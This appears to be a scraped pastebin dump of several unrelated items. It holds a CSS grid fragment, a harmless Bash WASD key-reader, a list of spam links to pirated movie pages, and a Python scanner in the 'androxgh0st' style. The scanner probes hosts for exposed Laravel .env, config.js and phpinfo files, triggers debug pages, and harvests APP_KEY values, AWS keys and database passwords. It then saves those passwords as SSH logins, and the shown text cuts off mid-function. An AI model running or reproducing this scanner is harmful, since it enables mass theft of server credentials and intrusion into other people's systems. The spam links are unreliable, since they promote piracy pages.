 .text { position:fixed;top:122px;width:22px;text-align:left;font-family:macondo;font-size:20px;color:green;line-height:44px;margin-top:44px; }
      .falsetext { position:fixed;font-size:1200px;line-height:1100px;color:transparent; }
 
 .row1, .row2, .row3, .row4, .row5, .row6, .row7, .row8, .row9, .row10, .row11, .row12, .row13, .row14, .row15, .row16, .row17, .row18,
 .row19, .row20, .row21, .row22, .row23, .row24, .row25, .row26, .row27, .row28, .row29, .row30, .row31, .row32, .row33, .row34, .row35, .row36,
 .row37, .row38, .row39, .row40, .row41, .row42, .row43, .row44, .row45, .row46, .row47, .row48, .row49, .row50, .row51, .row52, .row53, .row54,
 .row55, .row56, .row57, .row58, .row59, .row60, .row61, .row62, .row63, .row64, .row65, .row66, .row67, .row68, .row69, .row70, .row71, .row72
 { position:fixed;border-left:2px solid blue;top:10px;height:30.5vw; }
 .row1 { left:10px; } .row2 { left:20px; } .row3 { left:30px; } .row4 { left:40px; } .row5 { left:50px; } .row6 { left:60px; } .row7 { left:70px; } 
 .row8 { left:80px; } .row9 { left:90px; } .row10 { left:100px; } .row11 { left:110px; } .row12 { left:120px; } .row13 { left:130px; } .row14 { left:140px; } 
 .row15 { left:150px; } .row16 { left:160px; } .row17 { left:170px; } .row18 { left:180px; } .row19 { left:190px; } .row20 { left:200px; } .row21 { left:210px; } 
 .row22 { left:220px; } .row23 { left:230px; } .row24 { left:240px; } .row25 { left:250px; } .row26 { left:260px; } .row27 { left:270px; } .row28 { left:280px; } 
 .row29 { left:290px; } .row30 { left:300px; } .row31 { left:310px; } .row32 { left:320px; } .row33 { left:330px; } .row34 { left:340px; } .row35 { left:350px; } 
 .row36 { left:360px; } .row37 { left:370px; } .row38 { left:380px; } .row39 { left:390px; } .row40 { left:400px; } .row41 { left:410px; } .row42 { left:420px; } 
 .row43 { left:430px; } .row44 { left:440px; } .row45 { left:450px; } .row46 { left:460px; } .row47 { left:470px; } .row48 { left:480px; } .row49 { left:490px; } 
 .row50 { left:500px; } .row51 { left:510px; } .row52 { left:520px; } .row53 { left:530px; } .row54 { left:540px; } .row55 { left:550px; } .row56 { left:560px; } 
 .row57 { left:570px; } .row58 { left:580px; } .row59 { left:590px; } .row60 { left:600px; } .row61 { left:610px; } .row62 { left:620px; } .row63 { left:630px; } 
 .row64 { left:640px; } .row65 { left:650px; } .row66 { left:660px; } .row67 { left:670px; } .row68 { left:680px; } .row69 { left:690px; } .row70 { left:700px; } 
 .row71 { left:710px; } .row72 { left:720px; } 
 
 .bar1, .bar2, .bar3, .bar4, .bar5, .bar6, .bar7, .bar8, .bar9, .bar10, .bar11, .bar12, .bar13, .bar14, .bar15, .bar16, .bar17, .bar18, .bar19, .bar20, .bar21, 
 .bar22, .bar23, .bar24, .bar25, .bar26, .bar27, .bar28, .bar29, .bar30, .bar31, .bar32, .bar33, .bar34, .bar35, .bar36, .bar37, .bar38, .bar39,  .bar40 
 { position:fixed;border-top:2px solid blue;left:0px;width:100%; }
 .bar1 { top:10px; } .bar2 { top:20px; } .bar3 { top:30px; } .bar4 { top:40px; } .bar5 { top:50px; } .bar6 { top:60px; } .bar7 { top:70px; } 
 .bar8 { top:80px; } .bar9 { top:90px; } .bar10 { top:100px; } .bar11 { top:110px; } .bar12 { top:120px; } .bar13 { top:130px; } .bar14 { top:140px; } 
 .bar15 { top:150px; } .bar16 { top:160px; } .bar17 { top:170px; } .bar18 { top:180px; } .bar19 { top:190px; } .bar20 { top:200px; } .bar21 { top:210px; } 
 .bar22 { top:220px; } .bar23 { top:230px; } .bar24 { top:240px; } .bar25 { top:250px; } .bar26 { top:260px; } .bar27 { top:270px; } .bar28 { top:280px; } 
 .bar29 { top:290px; } .bar30 { top:300px; } .bar31 { top:310px; } .bar32 { top:320px; } .bar33 { top:330px; } .bar34 { top:340px; } 
 .bar35 { top:350px; } .bar36 { top:360px; } .bar37 { top:370px; } .bar38 { top:380px; } .bar39 { top:390px; } .bar40 { top:400px; } 

 .box1 { position:fixed;top:130px;left:100px;width:300px;height:235px;border:solid 4px #0f0; }
 .box2 { position:fixed;top:70px;left:70px;width:300px;height:235px;border:solid 4px gold; }
 .line1 { border-bottom: 3px solid red;width:70px;transform: rotate(65deg);transform-origin:left;margin:70px 0 0 370px; }
 .line2 { border-bottom: 3px solid red;width:70px;transform: rotate(65deg);transform-origin:left;margin:235px 0 0 370px; }
 .line3 { border-bottom: 3px solid red;width:70px;transform: rotate(65deg);transform-origin:left;margin:-240px 0 0 65px; }
 .line4 { border-bottom: 3px solid red;width:70px;transform: rotate(65deg);transform-origin:left;margin:235px 0 0 65px; }
 
   </style> 
 
 <div class=""row1""></div><div class=""row2""></div><div class=""row3""></div><div class=""row4""></div><div class=""row5""></div>
 <div class=""row6""></div><div class=""row7""></div><div class=""row8""></div><div class=""row9""></div><div class=""row10""></div>
 <div class=""row11""></div><div class=""row12""></div><div class=""row13""></div><div class=""row14""></div><div class=""row15""></div>
 <div class=""row16""></div><div class=""row17""></div><div class=""row18""></div> <div class=""row19""></div><div class=""row20""></div>
 <div class=""row21""></div><div class=""row22""></div><div class=""row23""></div> <div class=""row24""></div><div class=""row25""></div>
 <div class=""row26""></div><div class=""row27""></div><div class=""row28""></div> <div class=""row29""></div><div class=""row30""></div>
 <div class=""row31""></div><div class=""row32""></div><div class=""row33""></div> <div class=""row34""></div><div class=""row35""></div>
 <div class=""row36""></div> <div class=""row37""></div><div class=""row38""></div><div class=""row39""></div><div class=""row40""></div>
 <div class=""row41""></div> <div class=""row42""></div><div class=""row43""></div><div class=""row44""></div><div class=""row45""></div>
 <div class=""row46""></div> <div class=""row47""></div><div class=""row48""></div><div class=""row49""></div><div class=""row50""></div>
 <div class=""row51""></div> <div class=""row52""></div><div class=""row53""></div><div class=""row54""></div> <div class=""row55""></div>
 <div class=""row56""></div><div class=""row57""></div><div class=""row58""></div><div class=""row59""></div> <div class=""row60""></div>
 <div class=""row61""></div><div class=""row62""></div><div class=""row63""></div><div class=""row64""></div> <div class=""row65""></div>
 <div class=""row66""></div><div class=""row67""></div><div class=""row68""></div><div class=""row69""></div> <div class=""row70""></div>
 <div class=""row71""></div><div class=""row72""></div>

<div class=""bar1""></div><div class=""bar2""></div><div class=""bar3""></div>
<div class=""bar4""></div><div class=""bar5""></div><div class=""bar6""></div><div class=""bar7""></div><div class=""bar8""></div>
<div class=""bar9""></div><div class=""bar10""></div><div class=""bar11""></div><div class=""bar12""></div><div class=""bar13""></div>
<div class=""bar14""></div><div class=""bar15""></div><div class=""bar16""></div><div class=""bar17""></div><div class=""bar18""></div>
<div class=""bar19""></div><div class=""bar20""></div><div class=""bar21""></div><div class=""bar22""></div><div class=""bar23""></div>
<div class=""bar24""></div><div class=""bar25""></div><div class=""bar26""></div><div class=""bar27""></div><div class=""bar28""></div>
<div class=""bar29""></div><div class=""bar30""></div><div class=""bar31""></div><div class=""bar32""></div><div class=""bar33""></div>
<div class=""bar34""></div><div class=""bar35""></div><div class=""bar36""></div><div class=""bar37""></div><div class=""bar38""></div>
<div class=""bar39""></div><div class=""bar40""></div>

 <div class=""box1""></div>   <div class=""box2""></div>   
<div class=""line1""></div> <div class=""line2""></div> <div class=""line3""></div> <div class=""line4""></div>

"
j6DknUS4,navKey,j0h,Bash,Sunday 28th of May 2023 12:58:46 PM CDT,"#!/bin/bash
#set is used to set variables, and assist in debugging
#set -vx


#keys are wasd
w(){
	clear
echo -e ""Moving Forward\n""
	}

a(){
	clear
echo -e ""Turning Left\n""
	}	
	
s(){
	clear
echo -e ""Going Back\n""
	}
	
d(){
	clear
echo -e ""Turning right\n""
	}

while true; do

echo ""w=go forward a=go left s=back d=go right""
read -rsn1 input
	if [ ""$input"" = ""w"" ]; then 
		w
		elif [ ""$input"" = ""a"" ]; then
		a
		elif [ ""$input"" = ""s"" ]; then 
		s
		elif [ ""$input"" = ""d"" ]; then
		d
		else
		echo -e""something went wrong:\n"" $input
		exit
	fi
done
"
DjSysNZF,stbdertnrd,gadungw71,PHP,Sunday 28th of May 2023 12:21:14 PM CDT,"https://vk.com/@twblurray-the-little-mermaid
https://vk.com/@twblurrayhd-the-little-mermaid-2023-hd
https://vk.com/@twblurrayhd-fast-x-2023-10-hd
https://vk.com/@twblurray-10-fast-x-2023-hd
https://sites.google.com/jonin28.com/thelittlemermaid2023-hd/home
https://sites.google.com/jonin28.com/the-little-mermaid-2023/home
https://sites.google.com/jonin28.com/10fastxhdmoviesonline/home
https://sites.google.com/jonin28.com/fast-x-2023-10-hd/home
https://sites.google.com/movfeed.com/thelittlemermaid20231080p/home
https://sites.google.com/movfeed.com/2023the-little-mermaid-full-hd/home
https://sites.google.com/movfeed.com/fast-x-10-2023/home
https://www.eagleportland.com/group/mysite-231-group/discussion/f9ac7d2d-ac6e-4588-a496-c1c9091eb853
https://www.hoyolab.com/article/18878365
https://vk.com/@movpcinemark-the-little-mermaid-2023-1080-hd-thai
https://vk.com/@mopieboxoffice-th-2023-the-little-mermaid-m-thai-hd
https://zeerotech.us/pirates-of-the-caribbean-the-curse-of-the-black-pearl-unleashing-swashbuckling-magic-on-the-silver-screen/
https://pastelink.net/m2m3skfh
https://ide.geeksforgeeks.org/online-php-compiler/72ba926d-2c72-4b57-99f2-00d6a0d82c4d
https://pasteio.com/xj6t9g2aQBC6
https://dotnetfiddle.net/rT17df
https://onlinegdb.com/pyUPTOTYyv
https://backlinktool.io/p/2CKnofHDyP4hIeOGg6aq.html
https://rextester.com/RHFU27049
https://paste.awesom.eu/saetfbest/msme
https://paste.mozilla.org/P3aThKW2
https://homment.com/LgHLa0flWPPC0F9W8rXR
https://paste.feed-the-beast.com/view/d5584fc1
https://pastehere.xyz/arjmLbp2s/
https://notes.io/qCHWs
https://jsitor.com/Y_pPFnqkiF
https://yamcode.com/safgsehgseh"
nUG1RNSz,pyt,utchiha505,Python,Sunday 28th of May 2023 12:19:21 PM CDT,"import os
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from re import findall as reg
from re import match

import console
import paramiko
import requests
from bs4 import BeautifulSoup as bs

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
bd = '\u001b[1m'
res = '\u001b[0m'

requests.packages.urllib3.disable_warnings()

chk = False
save = True

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

headers2 = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def ref_eq(inp):
    return str(inp).replace('=',' = ',1)

def url_method_add(url,method,source):
    return 'URL = {}\nMETHOD = {}\n{}'.format(url,method,source)

def remove_cot(inp):
    try:
        rep = reg('= ""(.*?)""',str(inp))[0]
        return str(inp).replace('= ""{}""'.format(rep),'= {}'.format(rep))
    except:
        try:
            rep = reg(""= '(.*?)'"",str(inp))[0]
            return str(inp).replace(""= '{}'"".format(rep),'= {}'.format(rep))
        except:
            pass
    
def reformat_text_phpinfo(source):
    source = bs(source,'html.parser')
    table = source.find_all('table')
    for tab in table:
        if '$_SERVER' in str(tab):
            table = str(tab)
    fields = reg('<td class=""e"">(.*?)</td><td class=""v"">(.*?)</td></tr>',str(table))
    out = ''
    for field in fields:
        e = str(field[0]).split(""['"")[1].split(""']"")[0]
        v = field[1]
        x = '{} = {}'.format(e,v)
        if str(x) not in str(out):
            out += str(x) + '\n'
    return out

def reformat_text_Exception(source):
    source = bs(source,'html.parser')
    out = ''
    table = source.find('div',{'class':'data-table','id':'sg-environment-variables'}).find_all('tr')
    for t in table:
        if '<td>' in str(t):
            all = str(t).replace('\n','')
            name = str(all).split('<tr><td>')[1].split('</td><td>')[0]
            value = str(all).split('</span')[0].split('>')[-1]
            x = '{} = {}'.format(name,value)
            if ('= ""' in str(x) and str(x).endswith('""')) or (""= '"" in str(x) and str(x).endswith(""'"")):
                x = remove_cot(str(x))
            if str(x) not in str(out):
                if str(x).split('=')[1].replace(' ','') != '':
                    out += str(x) + '\n'
    return out

def reformat_text_env(source):
    source = str(source).split('\n')
    source = [source.replace('\r','') for source in source if str(source).replace('\r','') != '' and not(str(source).startswith('#')) and '${' not in str(source)] 
    source = [source for source in source if '=' in str(source) and str(source).split('=')[1] != '']
    out = ''
    for s in source:
        s = ref_eq(str(s))
        if ('= ""' in str(s) and str(s).endswith('""')) or (""= '"" in str(s) and str(s).endswith(""'"")):
            s = remove_cot(str(s))
        if str(s) not in str(out):
            out += s + '\n'
    return out

def reformat_text_config_js(source):
    source = str(source).split('\n')
    out = ''
    for dd in source:
        if ':""' in str(dd):
            name , value = str(dd).split(':',1)
            value = reg('""(.*?)""',str(value))[0]
            if str(value) != '':
                x = '{} = {}'.format(name,value)
                out += str(x) + '\n'
    return out

def reformat_text_js(source):
    source = str(source).split('\n')
    source = [source.replace('const ','') for source in source if str(source).startswith('const')]
    out = ''
    for s in source:
        if ""= '"" in str(s):
            n = str(s).split('=')[0].replace(' ','')
            v = reg(""= '(.*?)';"",str(s))[0]
            out += '{} = {}'.format(n,v) + '\n'
    return out

def debugfixer(source):
    out = ''
    source = bs(source ,'html.parser')
    tags = source.find_all('table',{'class':'data-table'})
    for tag in tags:
        if 'APP_KEY' in str(tag):
            source = tag
    tags = source.find_all('tr')
    for tag in tags:
        try:
            name = reg('<td>(.*?)</td>',str(tag))[0]
            value = str(tag).split('</span')[0].split('"">')[-1].split('</pre')[0].strip()
            s = '{} = {}'.format(name,value)
            if '= ""' in str(s) or ""= '"" in str(s):
                s = remove_cot(str(s))
            if str(s).split('=')[1].replace(' ','') != '':
                if str(s) not in str(out):
                    out += s + '\n'
        except:pass
    return out

def ssh_reformat(text):
    host = ''
    usr = ''
    pwd = ''
    text = str(text).split('\n')
    for line in text:
        if 'url' in str(line).lower():
            host = str(line).split('=')[1].strip()
        elif 'SSH_USERNAME'.lower() in str(line).lower():
            usr = str(line).split('=')[1].strip()
        elif 'SSH_PASSWORD'.lower() in str(line).lower():
            pwd = str(line).split('=')[1].strip()
    text = '{}|{}|{}'.format(host , usr , pwd)
    return text

def get_ssh(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'DB_USERNAME'.lower() in str(x).lower() or 'DB_PASSWORD'.lower() in str(x).lower():
            out += s + '\n'
    if 'DB_USERNAME'.lower() in str(out).lower() and 'DB_PASSWORD'.lower() in str(out).lower():
        out = str(out).replace('DB_USERNAME','SSH_USERNAME').replace('DB_PASSWORD','SSH_PASSWORD')
        return True , out
    else:
        return False , ''
    
def Extractor(url,method,source):
    if not os.path.isdir('Laravel_Results'):
        os.mkdir('Laravel_Results')
    msg = '{}[\u001b[32;1m+\u001b[0m] {} [ {}{}{} ] '.format(fw,url,fr,method,fw)

    cc = get_ssh(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# SSH #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/SSH.txt','a',errors='ignore').write(text + '\n')
            try:
                open('Laravel_Results/SSH_to_check.txt','a',errors='ignore').write(ssh_reformat(text) + '\n')
            except:
                nyx = ''
        msg += '\u001b[1m\u001b[42;1m SSH \u001b[0m '

    if str(msg)[-2] == ']':
        msg += ""[ {}Couldn't Get Anything{} ]"".format(fr,fw)

    print(msg)

def env(url):
    method = '/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_save(url):
    method = '/.env.save'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_php(url):
    method = '/.env.php'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                            print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                            print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def beta_env(url):
    method = '/beta/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def prod_env(url):
    method = '/prod/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_js(url):
    method = '/env.js'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_js(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def debug(url):
    method = 'DEBUG'
    
    try:
        req = requests.post('http://{}'.format(url),data={""0x[]"":""androxgh0st""},headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
            req = requests.post('https://{}'.format(url),data={""0x[]"":""androxgh0st""},headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = debugfixer(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = debugfixer(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.post('https://{}'.format(url),data={""0x[]"":""androxgh0st""},headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = debugfixer(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def config_js(url):
    method = '/config.js'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        req = str(req).replace(' ','')
        if '={' in str(req):
            req = str(req).replace('\n','')
            req = reg('={(.*?)}',str(req))
            for d in req:
                if 'aws' in str(d).lower():
                    req = d
                    break
            req = str(req).replace(',',',\n')
            if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
                req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
                req = str(req).replace(' ','')
                if '={' in str(req):
                    req = str(req).replace('\n','')
                    req = reg('={(.*?)}',str(req))
                    for d in req:
                        if 'aws' in str(d).lower():
                            req = d
                            break
                    req = str(req).replace(',',',\n')
                    if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                        if 'exception' not in str(req).lower():
                            req = reformat_text_config_js(req)
                            if str(req).replace('\n','').replace(' ','') != '':
                                if chk:
                                    print(req)
                                Extractor(url,method,req)
                                return True
                        else:
                            req = reformat_text_Exception(req)
                            if str(req).replace('\n','').replace(' ','') != '':
                                if chk:
                                    print(req)
                                Extractor(url,method,req)
                                return True
            else:
                if 'exception' not in str(req).lower():
                    req = reformat_text_config_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            req = str(req).replace(' ','')
            if '={' in str(req):
                req = str(req).replace('\n','')
                req = reg('={(.*?)}',str(req))
                for d in req:
                    if 'aws' in str(d).lower():
                        req = d
                        break
                req = str(req).replace(',',',\n')
                if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                    if 'exception' not in str(req).lower():
                        req = reformat_text_config_js(req)
                        if str(req).replace('\n','').replace(' ','') != '':
                            if chk:
                                print(req)
                            Extractor(url,method,req)
                            return True
                    else:
                        req = reformat_text_Exception(req)
                        if str(req).replace('\n','').replace(' ','') != '':
                            if chk:
                                print(req)
                            Extractor(url,method,req)
                            return True
        except:
            pass
    return False
    
def phpinfo(url):
    method = '/phpinfo'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
